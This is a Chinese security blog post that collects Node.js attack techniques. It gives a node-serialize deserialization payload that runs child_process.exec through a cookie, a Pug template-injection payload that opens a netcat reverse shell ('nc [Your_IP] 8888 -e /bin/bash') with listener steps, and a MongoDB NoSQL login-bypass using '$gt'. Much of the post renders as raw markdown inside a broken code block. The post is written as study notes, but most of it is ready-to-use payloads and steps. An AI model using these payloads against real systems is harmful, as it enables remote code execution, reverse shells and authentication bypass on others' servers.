<!DOCTYPE html><html lang="zh_CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Nodejs的一些问题 · Exi1Sh0w's Blog</title><meta name="description" content="努力努力再努力..."><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/jekyll.css"><!--[if lt IE 9]>
<script src="js/html5shiv.min.js"></script>
<script src="js/respond.min.js"></script>
<![endif]--><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Exi1Sh0w's Blog" type="application/atom+xml">
</head><body><header class="row-flex-row limit-width vh-center"><a href="/" class="logo"><img src="/favicon.png"></a><nav><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-link">Home</a></li><li class="nav-list-item"><a href="/archives/" class="nav-link active">   Blog</a></li><li class="nav-list-item"><a href="https://github.com/exi1sh0w" target="_blank" class="nav-link">github</a></li><li class="nav-list-item"><a href="/atom.xml" class="nav-link">rss</a></li></ul></nav></header><div class="container limit-width"><section class="row-flex-row"><div class="post"><article class="post-block"><h2 class="post-title"><a href="/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" class="post-title-link">Nodejs的一些问题</a></h2><div class="post-meta"><div class="post-time">星期六, 四月 6日 2019</div></div><div class="post-content"><p>通过学习，整理一些基于NodeJS的攻击方式，如有新发现，会持续更新</p>
<h2 id="一、Node反序列化"><a href="#一、Node反序列化" class="headerlink" title="一、Node反序列化"></a>一、Node反序列化</h2><p>1.通过修改cookie信息 base64编码，需要知道应用的绝对路径<br>2.poc:</p>
<figure class="highlight plain"><figcaption><span>()&#123;require('child_process').exec('这里填写命令', function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()"&#125;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 二、针对pug文件的攻击</span><br><span class="line"></span><br><span class="line">pug文件</span><br><span class="line"></span><br><span class="line">介绍:&lt;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaohuochai&#x2F;p&#x2F;7222227.html&gt;</span><br><span class="line"></span><br><span class="line">### REC</span><br><span class="line"></span><br><span class="line">1.首先登陆一个有效的账户</span><br><span class="line"></span><br><span class="line">2.poc</span><br><span class="line"></span><br><span class="line">&#96;-var x &#x3D; global.process.mainModule.require</span><br><span class="line">-x(&#39;child_process&#39;).exec(&#39;nc [Your_IP] 8888 -e &#x2F;bin&#x2F;bash&#39;)&#96;</span><br><span class="line"></span><br><span class="line">在pug中，符号&quot;-&quot;表示执行javascript</span><br><span class="line"></span><br><span class="line">Ps:debian系的linux发行版默认(debian&#x2F;ubuntu&#x2F;mint等)安装的都是netcat-openbsd版，没有-e参数</span><br><span class="line"></span><br><span class="line">3.使用burpsuite抓包，获取文件的哈希值以及应用的drouting</span><br><span class="line"></span><br><span class="line">![](&#x2F;img&#x2F;nodejs&#x2F;haxi.jpg)</span><br><span class="line"></span><br><span class="line">4.使用NC监听8888端口</span><br><span class="line"></span><br><span class="line">命令:nc -l -p 8888</span><br><span class="line"></span><br><span class="line">5.通过组合，访问该url，使之执行命令</span><br><span class="line"></span><br><span class="line">![](&#x2F;img&#x2F;nodejs&#x2F;ncshell.jpg)</span><br><span class="line"></span><br><span class="line">## 三、应用注入</span><br><span class="line"></span><br><span class="line">&gt; NoSQL 注入的一个常见例子是注入类似的东西: [&#123;&quot;$gt&quot;:&quot;&quot;&#125;] 。这个 JSON 对象基本上是说运算符( $gt )大于 NULL(&quot;&quot;)。由于逻辑上一切都大于 NULL，因此 JSON 对象成为一个真正正确的语句，允许我们绕过或注入 NoSQL 查询。这相当于 SQL 注入世界中的[&#39; or 1&#x3D;1—]。在 MongoDB 中，我们可以使用以下条件运算符之一:</span><br><span class="line">&gt;</span><br><span class="line">&gt; (&gt;)大于 - $gt </span><br><span class="line">&gt;</span><br><span class="line">&gt; (&lt;)小于 - $lt </span><br><span class="line">&gt;</span><br><span class="line">&gt; (&gt;&#x3D;)大于等于 - $gte </span><br><span class="line">&gt;</span><br><span class="line">&gt; (&lt;&#x3D;)小于等于 - $lte</span><br><span class="line"></span><br><span class="line">![](&#x2F;img&#x2F;nodejs&#x2F;inj1.jpg)</span><br><span class="line"></span><br><span class="line">在将字符串修改为&#96;&#96;&#96;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$gt&quot;:&quot;&quot;&#125;&#125;&#96;&#96;&#96;后，因为大于null的内容都为True。所以post请求更改为&#96;&#96;&#96;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:True&#125;&#96;&#96;&#96;了，类似于一般sql注入中 &#96;&#96;&#96;and 1&#x3D;1</span><br></pre></td></tr></table></figure>

</div></article><div class="pagination"><a href="/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="pagination-prev">PREV</a><a href="/2019/04/02/xss%E8%AE%B0%E5%BD%95/" class="pagination-next">NEXT</a></div><div class="comments"></div></div><aside class="sidebar"><h3>最新文章</h3><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/05/upload%E6%80%BB%E7%BB%93/">upload总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WebLogic_wls9-async_反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">Nodejs的一些问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/xss%E8%AE%B0%E5%BD%95/">xss记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/%E5%90%8E%E9%97%A8%E5%BD%92%E7%B1%BB/">后门归类</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传的攻击/防御</a></li></ul></aside></section></div><div class="extra"></div><footer class="footer"><div class="row-flex-row limit-width vh-center"><div class="copyright"><P>© 2020 <a href="/">Exi1Sh0w</P></div></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-80781234-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?ee75cf111111aa99f8540efa2570970";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>